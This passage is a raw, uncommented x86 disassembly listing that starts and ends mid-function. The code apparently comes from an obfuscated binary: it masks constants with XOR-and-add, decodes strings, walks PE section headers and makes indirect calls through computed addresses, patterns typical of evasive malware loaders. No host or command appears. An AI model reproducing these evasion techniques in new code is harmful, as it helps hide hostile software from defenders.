  41cf52:	mov    eax,DWORD PTR [ebx+0x1c8]
  41cf58:	mov    eax,DWORD PTR [eax]
  41cf5a:	xor    eax,esi
  41cf5c:	add    eax,edi
  41cf5e:	je     0x41cf97
  41cf60:	mov    ecx,DWORD PTR [ebp+0xc]
  41cf63:	mov    eax,DWORD PTR [ecx+0x28]
  41cf66:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  41cf6d:	mov    esi,DWORD PTR [ebp+0x8]
  41cf70:	push   DWORD PTR [ebp+0x14]
  41cf73:	xor    esi,0x899
  41cf79:	push   DWORD PTR [ebp+0x10]
  41cf7c:	add    esi,0x72e0
  41cf82:	or     WORD PTR [ecx+0x16],si
  41cf86:	add    eax,edx
  41cf88:	push   edx
  41cf89:	call   eax
  41cf8b:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b8
  41cf95:	jmp    0x41cfa1
  41cf97:	mov    eax,DWORD PTR [ebp+0xc]
  41cf9a:	mov    eax,DWORD PTR [eax+0x28]
  41cf9d:	add    eax,edx
  41cf9f:	call   eax
  41cfa1:	mov    DWORD PTR [ebp-0x8],eax
  41cfa4:	mov    eax,DWORD PTR [ebp-0x8]
  41cfa7:	mov    ecx,DWORD PTR [ebp+0x1c]
  41cfaa:	mov    DWORD PTR [ecx],eax
  41cfac:	mov    DWORD PTR [ebp-0x30],0x1
  41cfb3:	cmp    DWORD PTR [ebp-0x30],0x0
  41cfb7:	jne    0x41cfbd
  41cfb9:	and    DWORD PTR [ebp+0x20],0x0
  41cfbd:	mov    eax,DWORD PTR [ebp+0x20]
  41cfc0:	jmp    0x41cfc4
  41cfc2:	xor    eax,eax
  41cfc4:	pop    edi
  41cfc5:	pop    esi
  41cfc6:	pop    ebx
  41cfc7:	leave  
  41cfc8:	ret    0x1c
  41cfcb:	push   ebp
  41cfcc:	mov    ebp,esp
  41cfce:	movzx  edx,WORD PTR [ecx+0x6]
  41cfd2:	movzx  eax,WORD PTR [ecx+0x14]
  41cfd6:	push   ebx
  41cfd7:	push   edi
  41cfd8:	xor    edi,edi
  41cfda:	lea    eax,[eax+ecx*1+0x18]
  41cfde:	test   edx,edx
  41cfe0:	je     0x41d001
  41cfe2:	mov    ecx,DWORD PTR [eax+0xc]
  41cfe5:	lea    ebx,[ecx+esi*1]
  41cfe8:	cmp    DWORD PTR [ebp+0x8],ebx
  41cfeb:	jb     0x41cff9
  41cfed:	mov    ebx,DWORD PTR [eax+0x8]
  41cff0:	add    ebx,ecx
  41cff2:	add    ebx,esi
  41cff4:	cmp    DWORD PTR [ebp+0x8],ebx
  41cff7:	jb     0x41d003
  41cff9:	add    eax,0x28
  41cffc:	inc    edi
  41cffd:	cmp    edi,edx
  41cfff:	jb     0x41cfe2
  41d001:	xor    eax,eax
  41d003:	pop    edi
  41d004:	pop    ebx
  41d005:	pop    ebp
  41d006:	ret    0x4
  41d009:	push   ebp
  41d00a:	mov    ebp,esp
  41d00c:	sub    esp,0x34
  41d00f:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41d016:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d01d:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41d024:	mov    DWORD PTR [ebp-0x8],0xf89c8518
  41d02b:	mov    DWORD PTR [ebp-0x20],0xf89c85f8
  41d032:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41d039:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41d040:	mov    DWORD PTR [ebp-0x10],eax
  41d043:	mov    eax,DWORD PTR [ebp+0x8]
  41d046:	mov    DWORD PTR [ebp-0x14],eax
  41d049:	mov    eax,DWORD PTR [ebp-0xc]
  41d04c:	push   ebx
  41d04d:	mov    ecx,0x7510899
  41d052:	xor    eax,ecx
  41d054:	push   esi
  41d055:	mov    esi,DWORD PTR [ebp-0x10]
  41d058:	mov    edx,0x3272e0
  41d05d:	add    eax,edx
  41d05f:	push   edi
  41d060:	cmp    esi,eax
  41d062:	je     0x41d241
  41d068:	mov    eax,DWORD PTR [ebp-0xc]
  41d06b:	mov    esi,DWORD PTR [ebp-0x14]
  41d06e:	xor    eax,ecx
  41d070:	add    eax,edx
  41d072:	cmp    esi,eax
  41d074:	je     0x41d241
  41d07a:	mov    eax,DWORD PTR [ebp-0xc]
  41d07d:	xor    eax,ecx
  41d07f:	add    eax,edx
  41d081:	mov    DWORD PTR [ebp-0x24],eax
  41d084:	mov    eax,DWORD PTR [ebp-0xc]
  41d087:	xor    eax,ecx
  41d089:	add    eax,edx
  41d08b:	mov    DWORD PTR [ebp-0x28],eax
  41d08e:	mov    edi,DWORD PTR [ebp-0x20]
  41d091:	mov    ebx,DWORD PTR [ebp-0x8]
  41d094:	mov    esi,0x899
  41d099:	xor    edi,esi
  41d09b:	mov    eax,0x72e0
  41d0a0:	xor    ebx,esi
  41d0a2:	add    edi,eax
  41d0a4:	add    ebx,eax
  41d0a6:	sub    ebx,edi
  41d0a8:	mov    WORD PTR [ebp-0x8],bx
  41d0ac:	jmp    0x41d171
  41d0b1:	mov    edi,DWORD PTR [ebp-0xc]
  41d0b4:	mov    bx,WORD PTR [ebp-0x4]
  41d0b8:	xor    edi,esi
  41d0ba:	add    edi,eax
  41d0bc:	cmp    bx,di
  41d0bf:	je     0x41d1b3
  41d0c5:	mov    edi,DWORD PTR [ebp-0xc]
  41d0c8:	mov    ebx,DWORD PTR [ebp+0xc]
  41d0cb:	xor    edi,ecx
  41d0cd:	add    edi,edx
  41d0cf:	cmp    ebx,edi
  41d0d1:	mov    di,WORD PTR [ebp-0x4]
  41d0d5:	mov    bx,WORD PTR [ebp+0x8]
  41d0d9:	je     0x41d144
  41d0db:	cmp    bx,di
  41d0de:	je     0x41d14d
  41d0e0:	mov    edi,DWORD PTR [ebp-0x20]
  41d0e3:	mov    bx,WORD PTR [ebp+0x8]
  41d0e7:	xor    edi,esi
  41d0e9:	add    edi,eax
  41d0eb:	cmp    bx,di
  41d0ee:	jb     0x41d10e
  41d0f0:	mov    edi,DWORD PTR [ebp-0x2c]
  41d0f3:	mov    bx,WORD PTR [ebp+0x8]
  41d0f7:	xor    edi,esi
  41d0f9:	add    edi,eax
  41d0fb:	cmp    bx,di
  41d0fe:	ja     0x41d10e
  41d100:	movzx  edi,WORD PTR [ebp+0x8]
  41d104:	movzx  ebx,WORD PTR [ebp-0x8]
  41d108:	add    edi,ebx
  41d10a:	mov    WORD PTR [ebp+0x8],di
  41d10e:	mov    edi,DWORD PTR [ebp-0x20]
  41d111:	mov    bx,WORD PTR [ebp-0x4]
  41d115:	xor    edi,esi
  41d117:	add    edi,eax
  41d119:	cmp    bx,di
  41d11c:	jb     0x41d13c
  41d11e:	mov    edi,DWORD PTR [ebp-0x2c]
  41d121:	mov    bx,WORD PTR [ebp-0x4]
  41d125:	xor    edi,esi
  41d127:	add    edi,eax
  41d129:	cmp    bx,di
  41d12c:	ja     0x41d13c
  41d12e:	movzx  edi,WORD PTR [ebp-0x4]
  41d132:	movzx  ebx,WORD PTR [ebp-0x8]
  41d136:	add    edi,ebx
  41d138:	mov    WORD PTR [ebp-0x4],di
  41d13c:	mov    di,WORD PTR [ebp-0x4]
  41d140:	mov    bx,WORD PTR [ebp+0x8]
  41d144:	cmp    bx,di
  41d147:	jne    0x41d241
  41d14d:	mov    edi,DWORD PTR [ebp-0x1c]
  41d150:	mov    ebx,DWORD PTR [ebp-0x10]
  41d153:	xor    edi,ecx
  41d155:	lea    edi,[edi+ebx*1+0x3272e0]
  41d15c:	mov    DWORD PTR [ebp-0x10],edi
  41d15f:	mov    edi,DWORD PTR [ebp-0x1c]
  41d162:	mov    ebx,DWORD PTR [ebp-0x14]
  41d165:	xor    edi,ecx
  41d167:	lea    edi,[edi+ebx*1+0x3272e0]
  41d16e:	mov    DWORD PTR [ebp-0x14],edi
  41d171:	mov    edi,DWORD PTR [ebp-0x24]
  41d174:	mov    ebx,DWORD PTR [ebp-0x10]
  41d177:	mov    di,WORD PTR [ebx+edi*2]
  41d17b:	mov    WORD PTR [ebp+0x8],di
  41d17f:	mov    edi,DWORD PTR [ebp-0x28]
  41d182:	mov    ebx,DWORD PTR [ebp-0x14]
  41d185:	mov    di,WORD PTR [ebx+edi*2]
  41d189:	mov    WORD PTR [ebp-0x4],di
  41d18d:	mov    edi,DWORD PTR [ebp-0xc]
  41d190:	mov    bx,WORD PTR [ebp+0x8]
  41d194:	xor    edi,esi
  41d196:	add    edi,eax
  41d198:	cmp    bx,di
  41d19b:	jne    0x41d0b1
  41d1a1:	mov    eax,DWORD PTR [ebp-0x18]
  41d1a4:	mov    esi,DWORD PTR [ebp-0xc]
  41d1a7:	xor    eax,ecx
  41d1a9:	add    eax,edx
  41d1ab:	imul   eax,esi
  41d1ae:	mov    DWORD PTR [ebp-0xc],eax
  41d1b1:	jmp    0x41d1c5
  41d1b3:	mov    eax,DWORD PTR [ebp-0xc]
  41d1b6:	mov    esi,DWORD PTR [ebp-0x18]
  41d1b9:	xor    eax,ecx
  41d1bb:	lea    eax,[eax+esi*1+0x3272e0]
  41d1c2:	mov    DWORD PTR [ebp-0x18],eax
  41d1c5:	mov    eax,DWORD PTR [ebp-0x24]
  41d1c8:	sub    eax,edx
  41d1ca:	xor    eax,ecx
  41d1cc:	mov    DWORD PTR [ebp-0x30],eax
  41d1cf:	mov    eax,DWORD PTR [ebp-0x28]
  41d1d2:	sub    eax,edx
  41d1d4:	xor    eax,ecx
  41d1d6:	mov    DWORD PTR [ebp-0x34],eax
  41d1d9:	mov    eax,DWORD PTR [ebp-0x34]
  41d1dc:	mov    esi,DWORD PTR [ebp-0x1c]
  41d1df:	xor    esi,ecx
  41d1e1:	add    esi,edx
  41d1e3:	xor    eax,ecx
  41d1e5:	add    eax,0x3272e0
  41d1ea:	imul   esi,eax
  41d1ed:	mov    eax,DWORD PTR [ebp-0x14]
  41d1f0:	movzx  eax,WORD PTR [esi+eax*1]
  41d1f4:	mov    esi,DWORD PTR [ebp-0x30]
  41d1f7:	mov    edi,DWORD PTR [ebp-0x1c]
  41d1fa:	xor    esi,ecx
  41d1fc:	add    esi,edx
  41d1fe:	xor    edi,ecx
  41d200:	add    edi,edx
  41d202:	imul   edi,esi
  41d205:	mov    esi,DWORD PTR [ebp-0x10]
  41d208:	movzx  esi,WORD PTR [edi+esi*1]
  41d20c:	sub    eax,edx
  41d20e:	sub    esi,edx
  41d210:	xor    eax,ecx
  41d212:	xor    esi,ecx
  41d214:	cmp    esi,eax
  41d216:	jne    0x41d241
  41d218:	mov    eax,DWORD PTR [ebp-0x30]
  41d21b:	mov    esi,DWORD PTR [ebp-0x1c]
  41d21e:	xor    eax,ecx
  41d220:	add    eax,0x3272e0
  41d225:	xor    esi,ecx
  41d227:	add    esi,edx
  41d229:	imul   esi,eax
  41d22c:	mov    eax,DWORD PTR [ebp-0x10]
  41d22f:	movzx  eax,WORD PTR [esi+eax*1]
  41d233:	mov    esi,DWORD PTR [ebp-0xc]
  41d236:	sub    eax,edx
  41d238:	xor    eax,ecx
  41d23a:	cmp    eax,esi
  41d23c:	mov    eax,DWORD PTR [ebp-0xc]
  41d23f:	je     0x41d244
  41d241:	mov    eax,DWORD PTR [ebp-0x18]
  41d244:	pop    edi
  41d245:	xor    eax,ecx
  41d247:	pop    esi
  41d248:	add    eax,edx
  41d24a:	pop    ebx
  41d24b:	leave  
  41d24c:	ret    0x8
  41d24f:	push   ebp
  41d250:	mov    ebp,esp
  41d252:	push   ecx
  41d253:	mov    cx,WORD PTR [eax]
  41d256:	push   esi
  41d257:	mov    esi,0x3b50
  41d25c:	sub    cx,si
  41d25f:	mov    esi,0x8a8c
  41d264:	xor    cx,si
  41d267:	mov    esi,0x4e3c
  41d26c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d273:	mov    edx,0xf89c85b9
  41d278:	cmp    cx,si
  41d27b:	je     0x41d2da
  41d27d:	push   ebx
  41d27e:	push   edi
  41d27f:	movzx  ecx,cx
  41d282:	mov    edi,0xffcd8d20
  41d287:	mov    esi,0x7510899
  41d28c:	mov    ebx,0x4f80
  41d291:	cmp    cx,bx
  41d294:	jne    0x41d299
  41d296:	mov    DWORD PTR [ebp-0x4],edx
  41d299:	lea    edx,[edi+0x1]
  41d29c:	xor    edx,esi
  41d29e:	mov    edi,edx
  41d2a0:	xor    edi,esi
  41d2a2:	mov    cx,WORD PTR [eax+edi*2+0x64e5c0]
  41d2aa:	mov    ebx,0x3b50
  41d2af:	sub    cx,bx
  41d2b2:	mov    ebx,0x8a8c
  41d2b7:	xor    cx,bx
  41d2ba:	mov    ebx,0x4e3c
  41d2bf:	cmp    cx,bx
  41d2c2:	jne    0x41d28c
  41d2c4:	mov    ecx,DWORD PTR [ebp-0x4]
  41d2c7:	pop    edi
  41d2c8:	pop    ebx
  41d2c9:	cmp    ecx,0xf89c8586
  41d2cf:	je     0x41d2da
  41d2d1:	xor    ecx,esi
  41d2d3:	lea    eax,[eax+ecx*2+0x64e5c2]
  41d2da:	pop    esi
  41d2db:	leave  
  41d2dc:	ret    
  41d2dd:	push   ebp
  41d2de:	mov    ebp,esp
  41d2e0:	push   ecx
  41d2e1:	push   esi
  41d2e2:	push   edi
  41d2e3:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d2ea:	mov    esi,0xf89c85b9
  41d2ef:	call   0x41d24f
  41d2f4:	mov    edi,eax
  41d2f6:	mov    al,BYTE PTR [edi]
  41d2f8:	add    al,0x9
  41d2fa:	xor    al,0x73
  41d2fc:	cmp    al,0x7a
  41d2fe:	je     0x41d361
  41d300:	mov    eax,edi
  41d302:	mov    edx,0xffcd8d20
  41d307:	mov    ecx,0x7510899
  41d30c:	push   ebx
  41d30d:	mov    ax,WORD PTR [eax]
  41d310:	mov    ebx,0x3b50
  41d315:	sub    ax,bx
  41d318:	mov    ebx,0x8a8c
  41d31d:	xor    ax,bx
  41d320:	mov    ebx,0x4e52
  41d325:	cmp    ax,bx
  41d328:	jne    0x41d32d
  41d32a:	mov    DWORD PTR [ebp-0x4],esi
  41d32d:	lea    esi,[edx+0x1]
  41d330:	xor    esi,ecx
  41d332:	mov    edx,esi
  41d334:	xor    edx,ecx
  41d336:	lea    eax,[edi+edx*2+0x64e5c0]
  41d33d:	mov    bl,BYTE PTR [eax]
  41d33f:	add    bl,0x9
  41d342:	xor    bl,0x73
  41d345:	cmp    bl,0x7a
  41d348:	jne    0x41d30d
  41d34a:	mov    eax,DWORD PTR [ebp-0x4]
  41d34d:	pop    ebx
  41d34e:	cmp    eax,0xf89c8586
  41d353:	je     0x41d361
  41d355:	xor    eax,ecx
  41d357:	xor    ecx,ecx
  41d359:	mov    WORD PTR [edi+eax*2+0x64e5c0],cx
  41d361:	mov    eax,edi
  41d363:	pop    edi
  41d364:	pop    esi
  41d365:	leave  
  41d366:	ret    
  41d367:	push   ebp
  41d368:	mov    ebp,esp
  41d36a:	push   ecx
  41d36b:	push   esi
  41d36c:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41d373:	mov    esi,0xf89c85b9
  41d378:	call   0x41d24f
  41d37d:	mov    cx,WORD PTR [eax]
  41d380:	mov    edx,0x3b50
  41d385:	sub    cx,dx
  41d388:	mov    edx,0x8a8c
  41d38d:	xor    cx,dx
  41d390:	mov    edx,0x4e3c
  41d395:	cmp    cx,dx
  41d398:	je     0x41d3f1
  41d39a:	push   ebx
  41d39b:	push   edi
  41d39c:	movzx  ecx,cx
  41d39f:	mov    edx,0xffcd8d20
  41d3a4:	mov    edi,0x7510899
  41d3a9:	mov    ebx,0x4e52
  41d3ae:	cmp    cx,bx
  41d3b1:	jne    0x41d3b6
  41d3b3:	mov    DWORD PTR [ebp-0x4],esi
  41d3b6:	lea    esi,[edx+0x1]
  41d3b9:	xor    esi,edi
  41d3bb:	mov    edx,esi
  41d3bd:	xor    edx,edi
  41d3bf:	mov    cx,WORD PTR [eax+edx*2+0x64e5c0]
  41d3c7:	mov    ebx,0x3b50
  41d3cc:	sub    cx,bx
  41d3cf:	mov    ebx,0x8a8c
  41d3d4:	xor    cx,bx
  41d3d7:	mov    ebx,0x4e3c
  41d3dc:	cmp    cx,bx
  41d3df:	jne    0x41d3a9
  41d3e1:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41d3e8:	pop    edi
  41d3e9:	pop    ebx
  41d3ea:	je     0x41d3f1
  41d3ec:	xor    eax,eax
  41d3ee:	inc    eax
  41d3ef:	jmp    0x41d3f3
  41d3f1:	xor    eax,eax
  41d3f3:	pop    esi
  41d3f4:	leave  
  41d3f5:	ret    
  41d3f6:	push   ebp
  41d3f7:	mov    ebp,esp
  41d3f9:	push   ecx
  41d3fa:	mov    eax,DWORD PTR [ebp+0x8]
  41d3fd:	movzx  ecx,WORD PTR [eax]
  41d400:	push   esi
  41d401:	lea    eax,[ecx-0x3b50]
  41d407:	mov    esi,0x8a8c
  41d40c:	push   edi
  41d40d:	xor    eax,esi
  41d40f:	mov    edi,0x4e3c
  41d414:	mov    DWORD PTR [ebp-0x4],edx
  41d417:	cmp    ax,di
  41d41a:	je     0x41d447
  41d41c:	mov    eax,DWORD PTR [ebp+0x8]
  41d41f:	sub    eax,edx
  41d421:	mov    DWORD PTR [ebp+0x8],eax
  41d424:	jmp    0x41d429
  41d426:	mov    eax,DWORD PTR [ebp+0x8]
  41d429:	mov    WORD PTR [edx],cx
  41d42c:	add    edx,0x2
  41d42f:	movzx  edi,WORD PTR [eax+edx*1]
  41d433:	mov    ecx,edi
  41d435:	add    edi,0xffffc4b0
  41d43b:	xor    edi,esi
  41d43d:	mov    eax,0x4e3c
  41d442:	cmp    di,ax
  41d445:	jne    0x41d426
  41d447:	xor    eax,eax
  41d449:	pop    edi
  41d44a:	mov    WORD PTR [edx],ax
  41d44d:	mov    eax,DWORD PTR [ebp-0x4]
  41d450:	pop    esi
  41d451:	leave  
  41d452:	ret    0x4
  41d455:	push   ebp
  41d456:	mov    ebp,esp
  41d458:	sub    esp,0x18
  41d45b:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41d462:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41d469:	mov    eax,DWORD PTR [ebp-0x14]
  41d46c:	xor    eax,0x7510899
  41d471:	add    eax,0x3272e0
  41d476:	mov    DWORD PTR [ebp-0x8],eax
  41d479:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  41d480:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41d487:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41d48e:	mov    eax,DWORD PTR [ebp-0x14]
  41d491:	xor    eax,0x7510899
  41d496:	mov    ecx,DWORD PTR [ebp-0x8]
  41d499:	lea    eax,[ecx+eax*1+0x3272e0]
  41d4a0:	mov    ecx,DWORD PTR [ebp-0x18]
  41d4a3:	xor    ecx,0x7510899
  41d4a9:	add    ecx,0x3272e0
  41d4af:	mov    edx,DWORD PTR [ebp+0x10]
  41d4b2:	imul   edx,ecx
  41d4b5:	cmp    eax,edx
  41d4b7:	jae    0x41d5aa
  41d4bd:	mov    eax,DWORD PTR [ebp+0x10]
  41d4c0:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4c3:	sub    eax,ecx
  41d4c5:	mov    ecx,DWORD PTR [ebp-0x10]
  41d4c8:	xor    ecx,0x7510899
  41d4ce:	add    ecx,0x3272e0
  41d4d4:	cmp    eax,ecx
  41d4d6:	jbe    0x41d508
  41d4d8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4db:	add    eax,DWORD PTR [ebp-0x8]
  41d4de:	mov    ecx,DWORD PTR [ebp+0xc]
  41d4e1:	add    ecx,DWORD PTR [ebp-0x8]
  41d4e4:	mov    edx,DWORD PTR [ecx]
  41d4e6:	mov    DWORD PTR [eax],edx
  41d4e8:	mov    ecx,DWORD PTR [ecx+0x4]
  41d4eb:	mov    DWORD PTR [eax+0x4],ecx
  41d4ee:	mov    eax,DWORD PTR [ebp-0x10]
  41d4f1:	xor    eax,0x7510899
  41d4f6:	mov    ecx,DWORD PTR [ebp-0x8]
  41d4f9:	lea    eax,[ecx+eax*1+0x3272e0]
  41d500:	mov    DWORD PTR [ebp-0x8],eax
  41d503:	jmp    0x41d5a5
  41d508:	mov    eax,DWORD PTR [ebp+0x10]
  41d50b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d50e:	sub    eax,ecx
  41d510:	mov    ecx,DWORD PTR [ebp-0xc]
  41d513:	xor    ecx,0x7510899
  41d519:	add    ecx,0x3272e0
  41d51f:	cmp    eax,ecx
  41d521:	jbe    0x41d54a
  41d523:	mov    eax,DWORD PTR [ebp+0x8]
  41d526:	add    eax,DWORD PTR [ebp-0x8]
  41d529:	mov    ecx,DWORD PTR [ebp+0xc]
  41d52c:	add    ecx,DWORD PTR [ebp-0x8]
  41d52f:	mov    ecx,DWORD PTR [ecx]
  41d531:	mov    DWORD PTR [eax],ecx
  41d533:	mov    eax,DWORD PTR [ebp-0xc]
  41d536:	xor    eax,0x7510899
  41d53b:	mov    ecx,DWORD PTR [ebp-0x8]
  41d53e:	lea    eax,[ecx+eax*1+0x3272e0]
  41d545:	mov    DWORD PTR [ebp-0x8],eax
  41d548:	jmp    0x41d5a5
  41d54a:	mov    eax,DWORD PTR [ebp+0x10]
  41d54d:	mov    ecx,DWORD PTR [ebp-0x8]
  41d550:	sub    eax,ecx
  41d552:	mov    ecx,DWORD PTR [ebp-0x4]
  41d555:	xor    ecx,0x7510899
  41d55b:	add    ecx,0x3272e0
  41d561:	cmp    eax,ecx
  41d563:	jbe    0x41d58e
  41d565:	mov    eax,DWORD PTR [ebp+0x8]
  41d568:	add    eax,DWORD PTR [ebp-0x8]
  41d56b:	mov    ecx,DWORD PTR [ebp+0xc]
  41d56e:	add    ecx,DWORD PTR [ebp-0x8]
  41d571:	mov    cx,WORD PTR [ecx]
  41d574:	mov    WORD PTR [eax],cx
  41d577:	mov    eax,DWORD PTR [ebp-0x4]
  41d57a:	xor    eax,0x7510899
  41d57f:	mov    ecx,DWORD PTR [ebp-0x8]
  41d582:	lea    eax,[ecx+eax*1+0x3272e0]
  41d589:	mov    DWORD PTR [ebp-0x8],eax
  41d58c:	jmp    0x41d5a5
  41d58e:	mov    eax,DWORD PTR [ebp+0x8]
  41d591:	add    eax,DWORD PTR [ebp-0x8]
  41d594:	mov    ecx,DWORD PTR [ebp+0xc]
  41d597:	add    ecx,DWORD PTR [ebp-0x8]
  41d59a:	mov    cl,BYTE PTR [ecx]
  41d59c:	mov    BYTE PTR [eax],cl
  41d59e:	mov    eax,DWORD PTR [ebp-0x8]
  41d5a1:	inc    eax
  41d5a2:	mov    DWORD PTR [ebp-0x8],eax
  41d5a5:	jmp    0x41d48e
  41d5aa:	leave  
  41d5ab:	ret    0xc
  41d5ae:	push   ebp
  41d5af:	mov    ebp,esp
  41d5b1:	sub    esp,0xc
  41d5b4:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d5bb:	push   esi
  41d5bc:	mov    esi,eax
  41d5be:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41d5c5:	mov    edx,DWORD PTR [ebp-0x4]
  41d5c8:	mov    eax,0x7510899
  41d5cd:	xor    edx,eax
  41d5cf:	mov    ecx,0x3272e0
  41d5d4:	add    edx,ecx
  41d5d6:	cmp    esi,edx
  41d5d8:	je     0x41d61a
  41d5da:	push   ebx
  41d5db:	push   edi
  41d5dc:	mov    edx,DWORD PTR [ebp-0x8]
  41d5df:	mov    ebx,DWORD PTR [ebp+0x8]
  41d5e2:	xor    edx,eax
  41d5e4:	mov    edi,0xffcd8d20
  41d5e9:	sub    edi,edx
  41d5eb:	add    esi,edi
  41d5ed:	lea    edx,[esi-0x3272e0]
  41d5f3:	xor    edx,eax
  41d5f5:	mov    DWORD PTR [ebp-0xc],edx
  41d5f8:	mov    edx,DWORD PTR [ebp-0x4]
  41d5fb:	mov    edi,DWORD PTR [ebp-0xc]
  41d5fe:	xor    dl,0x99
  41d601:	sub    dl,0x20
  41d604:	xor    edi,eax
  41d606:	mov    BYTE PTR [edi+ebx*1+0x3272e0],dl
  41d60d:	mov    edx,DWORD PTR [ebp-0x4]
  41d610:	xor    edx,eax
  41d612:	add    edx,ecx
  41d614:	cmp    esi,edx
  41d616:	jne    0x41d5dc
  41d618:	pop    edi
  41d619:	pop    ebx
  41d61a:	pop    esi
  41d61b:	leave  
  41d61c:	ret    0x4
  41d61f:	push   ebp
  41d620:	mov    ebp,esp
  41d622:	sub    esp,0x21c
  41d628:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  41d62f:	mov    DWORD PTR [ebp-0x14],0xf89c85b8
  41d636:	mov    eax,DWORD PTR [ebp+0x10]
  41d639:	mov    eax,DWORD PTR [ebp-0x4]
  41d63c:	mov    ecx,DWORD PTR [ebp+0x8]
  41d63f:	push   esi
  41d640:	push   edi
  41d641:	mov    edi,0x7510899
  41d646:	xor    eax,edi
  41d648:	mov    esi,0x3272e0
  41d64d:	add    eax,esi
  41d64f:	cmp    eax,ecx
  41d651:	mov    eax,DWORD PTR [ebp-0x4]
  41d654:	jne    0x41d65f
  41d656:	xor    eax,edi
  41d658:	add    eax,esi
  41d65a:	jmp    0x41d70b
  41d65f:	mov    ecx,DWORD PTR [ebp+0xc]
  41d662:	xor    eax,edi
  41d664:	add    eax,esi
  41d666:	cmp    eax,ecx
  41d668:	jne    0x41d66f
  41d66a:	mov    eax,DWORD PTR [ebp-0x4]
  41d66d:	jmp    0x41d656
  41d66f:	lea    eax,[ebp-0x21c]
  41d675:	mov    DWORD PTR [ebp-0x8],eax
  41d678:	mov    eax,DWORD PTR [ebp+0xc]
  41d67b:	mov    DWORD PTR [ebp-0x10],eax
  41d67e:	mov    eax,DWORD PTR [ebp-0x4]
  41d681:	xor    eax,edi
  41d683:	add    eax,esi
  41d685:	mov    DWORD PTR [ebp+0x10],eax
  41d688:	mov    eax,DWORD PTR [ebp+0xc]
  41d68b:	push   ebx
  41d68c:	call   0x41d367
  41d691:	mov    ebx,eax
  41d693:	mov    eax,DWORD PTR [ebp+0x8]
  41d696:	mov    eax,DWORD PTR [eax+0x14]
  41d699:	jmp    0x41d6f3
  41d69b:	mov    eax,DWORD PTR [ebp+0xc]
  41d69e:	sub    eax,0x8
  41d6a1:	mov    DWORD PTR [ebp-0xc],eax
  41d6a4:	mov    eax,DWORD PTR [ebp-0xc]
  41d6a7:	mov    eax,DWORD PTR [eax+0x28]
  41d6aa:	call   0x41d24f
  41d6af:	mov    DWORD PTR [ebp+0x10],eax
  41d6b2:	push   DWORD PTR [ebp+0x10]
  41d6b5:	mov    edx,DWORD PTR [ebp-0x8]
  41d6b8:	call   0x41d3f6
  41d6bd:	mov    eax,DWORD PTR [ebp-0x4]
  41d6c0:	xor    eax,edi
  41d6c2:	add    eax,esi
  41d6c4:	cmp    eax,ebx
  41d6c6:	jne    0x41d6d0
  41d6c8:	mov    eax,DWORD PTR [ebp-0x8]
  41d6cb:	call   0x41d2dd
  41d6d0:	mov    eax,DWORD PTR [ebp-0x14]
  41d6d3:	xor    eax,edi
  41d6d5:	add    eax,esi
  41d6d7:	push   eax
  41d6d8:	push   DWORD PTR [ebp-0x10]
  41d6db:	mov    eax,DWORD PTR [ebp-0x8]
  41d6de:	call   0x41d009
  41d6e3:	mov    ecx,DWORD PTR [ebp-0x4]
  41d6e6:	xor    ecx,edi
  41d6e8:	add    ecx,esi
  41d6ea:	cmp    eax,ecx
  41d6ec:	je     0x41d711
  41d6ee:	mov    eax,DWORD PTR [ebp+0xc]
  41d6f1:	mov    eax,DWORD PTR [eax]
  41d6f3:	mov    DWORD PTR [ebp+0xc],eax
  41d6f6:	mov    eax,DWORD PTR [ebp+0x8]
  41d6f9:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6fc:	add    eax,0x14
  41d6ff:	cmp    ecx,eax
  41d701:	jne    0x41d69b
  41d703:	mov    eax,DWORD PTR [ebp-0x4]
  41d706:	xor    eax,edi
  41d708:	add    eax,esi
  41d70a:	pop    ebx
  41d70b:	pop    edi
  41d70c:	pop    esi
  41d70d:	leave  
  41d70e:	ret    0xc
  41d711:	mov    eax,DWORD PTR [ebp-0xc]
  41d714:	mov    eax,DWORD PTR [eax+0x18]
  41d717:	jmp    0x41d70a
  41d719:	push   ebp
  41d71a:	mov    ebp,esp
  41d71c:	mov    eax,DWORD PTR [ebp+0xc]
  41d71f:	sub    esp,0x10
  41d722:	cmp    DWORD PTR [ebp+0x8],0x0
  41d726:	push   ebx
  41d727:	push   esi
  41d728:	push   edi
  41d729:	je     0x41d7de
  41d72f:	test   eax,eax
  41d731:	je     0x41d7de
  41d737:	movzx  eax,WORD PTR [eax+0x20]
  41d73b:	mov    ecx,eax
  41d73d:	mov    DWORD PTR [ebp-0x10],eax
  41d740:	xor    edx,edx
  41d742:	and    DWORD PTR [ebp-0x8],edx
  41d745:	mov    eax,0x8a8c
  41d74a:	xor    ecx,eax
  41d74c:	add    ecx,0x3b50
  41d752:	mov    DWORD PTR [ebp-0xc],ecx
  41d755:	and    DWORD PTR [ebp-0x4],0x0
  41d759:	xor    ecx,ecx
  41d75b:	push   0x78
  41d75d:	pop    edi
  41d75e:	cmp    cx,WORD PTR [ebp-0xc]
  41d762:	jae    0x41d7c8
  41d764:	lea    esi,[edx-0x3b50]
  41d76a:	xor    esi,eax
  41d76c:	movzx  ecx,WORD PTR [ebp-0x4]
  41d770:	mov    ebx,DWORD PTR [ebp+0xc]
  41d773:	lea    ecx,[ebx+ecx*4]
  41d776:	cmp    WORD PTR [ecx+0x2],si
  41d77a:	jne    0x41d7b3
  41d77c:	movzx  ecx,WORD PTR [ecx]
  41d77f:	mov    edi,0x4e3c
  41d784:	cmp    cx,di
